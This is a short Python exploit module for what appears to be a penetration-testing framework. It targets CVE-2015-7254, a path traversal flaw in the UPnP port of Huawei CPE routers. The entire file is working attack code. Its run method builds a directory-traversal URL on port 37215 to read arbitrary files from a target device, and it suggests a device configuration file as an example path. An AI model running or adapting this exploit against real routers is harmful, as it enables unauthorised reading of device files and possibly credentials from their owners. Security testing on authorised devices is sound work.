from lib.interfaces.iexploit import IExploit
from modules.auxiliary.http import HTTP
from modules.auxiliary.message import Message


class Exploit(IExploit):
    def __init__(self):
        super(Exploit, self).__init__(
            name = "Remote arbitrary file read on Huawei",
            file = "lfi_hg532e",
            authors = "Roberto Paleari and Aristide Fattori",
            date = "06/11/2015",
            cwe = "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
            CVE = "CVE-2015-7254",
            description = "Multiple Huawei CPE models are vulnerable to a directory traversal issue affecting an Internet-facing web port \
            (tcp/37215, on the tested devices). \
            This port is devoted to the UPnP service.",
            references = "https://github.com/ud2/advisories/tree/master/embedded/huawei/cve-2015-7254/"
        )

    def check(self, path):
        if not path.startswith("/"):
            Message.critical("Error", "An absolute path is required. Example: '/etc/defaultcfg.xml'")

        return True

    def run(self, path):
        http = HTTP()
        URL = "http://{0}:37215/icon/../../../{1}".format(self.getIP(), path)
        data = http.GET(URL)

        return data
